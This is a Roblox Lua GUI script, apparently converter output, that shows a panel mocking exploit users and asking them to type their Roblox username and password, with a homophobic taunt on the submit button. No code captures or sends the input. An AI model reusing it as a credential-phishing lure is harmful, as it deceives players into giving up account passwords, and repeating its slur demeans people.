-- Gui to Lua
-- Version: 3.2

-- Instances:

local InsertedObjects = Instance.new("ScreenGui")
local Frame = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextBox_2 = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")

--Properties:

InsertedObjects.Name = "InsertedObjects"
InsertedObjects.Parent = game.CoreGui

Frame.Name = "Frame"
Frame.Parent = InsertedObjects
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Size = UDim2.new(0, 1096, 0, 527)
Frame.Image = "rbxassetid://2790382281"
Frame.ImageColor3 = Color3.fromRGB(35, 35, 35)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(4, 4, 252, 252)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.353144109, 0, -0.0880800411, 0)
TextLabel.Size = UDim2.new(0, 320, 0, 290)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "my mans rlly tried to use the shittiest exploit in the world lmaooo"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 30.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.408759117, 0, 0.26375711, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "anyways uwu would you like to type your roblox information?"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 14.000

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.424270064, 0, 0.358633757, 0)
TextBox.Size = UDim2.new(0, 200, 0, 50)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "username"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

TextBox_2.Parent = Frame
TextBox_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.Position = UDim2.new(0.424270064, 0, 0.480075896, 0)
TextBox_2.Size = UDim2.new(0, 200, 0, 50)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.Text = "pessword"
TextBox_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox_2.TextSize = 14.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0.353102177, 0, 0.607210636, 0)
TextButton.Size = UDim2.new(0, 337, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "sumbit or gay"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
